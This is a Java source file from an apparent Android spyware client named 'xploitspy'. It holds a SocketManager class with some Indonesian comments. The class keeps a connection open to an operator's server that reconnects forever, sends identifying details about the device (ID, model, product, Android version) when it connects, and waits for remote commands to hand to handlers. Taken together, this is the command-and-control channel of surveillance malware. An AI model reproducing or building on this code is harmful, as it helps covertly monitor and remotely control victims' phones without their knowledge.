package com.xploitspy.client.manager;

import android.content.Context;
import android.util.Log;
import com.xploitspy.client.Config;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

/**
 * SocketManager - Mengelola koneksi WebSocket ke server
 */
public class SocketManager {
    
    private static final String TAG = "SocketManager";
    private Socket socket;
    private Context context;
    private boolean isConnected = false;
    
    public SocketManager(Context context) {
        this.context = context;
    }
    
    public void connect() {
        try {
            IO.Options options = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionAttempts(Integer.MAX_VALUE)
                .setReconnectionDelay(1000)
                .build();
            
            socket = IO.socket(Config.SOCKET_URL, options);
            
            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected to server");
                isConnected = true;
                registerDevice();
            });
            
            socket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.d(TAG, "Disconnected from server");
                isConnected = false;
            });
            
            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Connection error: " + args[0]);
                isConnected = false;
            });
            
            socket.on("command", args -> {
                if (args.length > 0 && args[0] instanceof JSONObject) {
                    handleCommand((JSONObject) args[0]);
                }
            });
            
            socket.connect();
            
        } catch (URISyntaxException e) {
            Log.e(TAG, "Error connecting to server", e);
        }
    }
    
    public void disconnect() {
        if (socket != null) {
            socket.disconnect();
            socket = null;
        }
        isConnected = false;
    }
    
    public boolean isConnected() {
        return isConnected && socket != null && socket.connected();
    }
    
    private void registerDevice() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("deviceId", Config.getDeviceId(context));
            deviceInfo.put("deviceName", android.os.Build.MODEL);
            String productName = android.os.Build.PRODUCT != null ? android.os.Build.PRODUCT : "Unknown";
            deviceInfo.put("productName", productName);
            deviceInfo.put("androidVersion", android.os.Build.VERSION.RELEASE);
            
            socket.emit("register", deviceInfo);
            Log.d(TAG, "Device registered (Product: " + productName + ")");
        } catch (Exception e) {
            Log.e(TAG, "Error registering device", e);
        }
    }
    
    public void emit(String event, Object data) {
        if (isConnected() && socket != null) {
            socket.emit(event, data);
        }
    }
    
    private void handleCommand(JSONObject command) {
        // Handle commands from server
        // Implementasi akan dilakukan di DataManager
        Log.d(TAG, "Received command: " + command.toString());
    }
    
    public void onCommand(String command, CommandHandler handler) {
        if (socket != null) {
            socket.on("command", args -> {
                if (args.length > 0 && args[0] instanceof JSONObject) {
                    try {
                        JSONObject cmd = (JSONObject) args[0];
                        String cmdType = cmd.getString("command");
                        if (cmdType.equals(command)) {
                            handler.handle(cmd);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error handling command", e);
                    }
                }
            });
        }
    }
    
    public interface CommandHandler {
        void handle(JSONObject command);
    }
}

